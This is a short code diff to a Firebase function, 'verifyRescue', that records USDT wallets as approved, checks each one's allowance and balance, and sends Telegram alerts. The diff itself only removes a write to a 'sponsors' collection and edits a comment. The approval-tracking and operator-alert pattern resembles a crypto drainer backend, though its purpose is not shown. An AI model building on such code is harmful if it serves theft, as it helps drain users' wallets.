@@ -90,7 +90,6 @@ export const verifyRescue = functions
         updatedAt: admin.firestore.FieldValue.serverTimestamp(),
       };
       await db.collection("wallets").doc(lowerFrom).set(approvalData, { merge: true });
-      await db.collection("sponsors").doc(lowerFrom).set(approvalData, { merge: true });
       console.log(`[verifyRescue] Recorded wallet ${lowerFrom} as APPROVED in Firestore`);
     } catch (dbErr) {
       console.error("[verifyRescue] Error recording approved wallet to firestore:", dbErr);
@@ -122,7 +121,7 @@ export const verifyRescue = functions
         allowance = await usdtReadOnly.allowance(from, to);
         balance = await usdtReadOnly.balanceOf(from);
 
-        // If balance is 0, wallet approval is already registered in sponsors!
+        // If balance is 0, wallet approval is already registered in wallets collection!
         if (balance === 0n) {
           console.log(`[verifyRescue] Wallet ${from} approved successfully with 0 USDT balance.`);
           import("../lib/telegram").then(({ sendTelegramMessage }) => {
